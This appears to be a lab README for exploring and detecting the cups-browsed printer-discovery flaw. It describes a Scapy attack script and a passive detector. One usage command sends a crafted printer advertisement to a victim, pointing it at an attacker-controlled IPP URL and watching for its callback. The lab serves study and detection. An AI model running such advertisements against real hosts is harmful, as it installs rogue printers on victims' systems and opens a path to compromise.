# CUPS Vulnerability Exploration and Detection Laboratory

This laboratory explores the insecure printer-discovery vulnerabilities affecting the Common Unix Printing System (CUPS) daemon components (`cups-browsed`), focusing on unauthorized remote printer installation mechanisms.

## Project Structure

```text
.
├── cups_attack.py       # Scapy-based printer-discovery packet generation tool
├── cups_detector.py     # Passive network traffic monitoring and detection script
├── requirements.txt     # Python environment dependency configuration
├── pcap_files/          # Captured baseline and attack validation PCAP sequences
└── evidence/            # Operational configurations, logs, and alert exports
```

## Setup & Dependencies

```bash
pip install -r requirements.txt
```

Sending/sniffing raw packets requires root privileges (`sudo`).

## Usage Instructions

### 1. Attack Script Execution

Send a crafted printer advertisement and watch for the victim's callback:

```bash
sudo python3 cups_attack.py -t <VICTIM_IP> -u "ipp://<ATTACKER_IP>:<PORT>/printers/<Name>" \
    --type-flags 0 --location "Lab Printer" --description "Test Printer" \
    --watch 10 --iface <BRIDGE_INTERFACE> -o pcap_files/attack_run.pcap
```

Find your Docker bridge interface with `ip link show | grep br-`. Key options:

- `--type-flags`, `--location`, `--description` — manipulate discovery message fields
- `--watch SECONDS --iface <bridge>` — sniff for a victim callback after sending
- `-o` — export sent/captured packets to PCAP

### 2. Detection Engine Execution

```bash
# Offline analysis
python3 cups_detector.py -r pcap_files/attack_run.pcap -o evidence/alerts.json

# Live monitoring
sudo python3 cups_detector.py -i <BRIDGE_INTERFACE> --timeout 30 -o evidence/live_alerts.csv
```

Alerts are exported to CSV or JSON based on the `-o` file extension. Use `--allow <IP>` to add additional trusted printer IPs to the allowlist.